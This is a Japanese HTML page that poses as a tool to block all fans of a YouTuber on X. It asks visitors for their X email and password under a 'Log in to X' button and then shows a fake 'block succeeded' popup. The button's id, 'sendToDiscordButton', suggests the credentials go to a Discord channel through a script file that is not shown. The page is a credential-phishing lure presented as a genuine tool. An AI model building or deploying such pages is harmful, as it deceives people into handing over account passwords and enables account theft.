<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>全ヒカマーをブロックするツール</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        
        <h1 class="main-title">全ヒカマーをブロックするツールです</h1> 

        <div class="form-group">
            
            <label for="emailInput" class="input-label">メールアドレスを入力</label>
            <input type="text" id="emailInput" class="text-input" placeholder="メールアドレス">
        </div>

        <div class="form-group">
            
            <label for="passwordInput" class="input-label">パスワードを入力</label>
            <input type="password" id="passwordInput" class="text-input" placeholder="パスワード">
        </div>

        <button id="sendToDiscordButton" class="submit-button">Xにログインする</button>
    </div>

    <div id="cModal" class="modal">
        <div class="modal-content-popup"> 
            <p class="popup-title-bar">通知</p>
            <p class="popup-message">ブロックに成功しました！</p>
            <button id="okButton" class="ok-button">OK</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
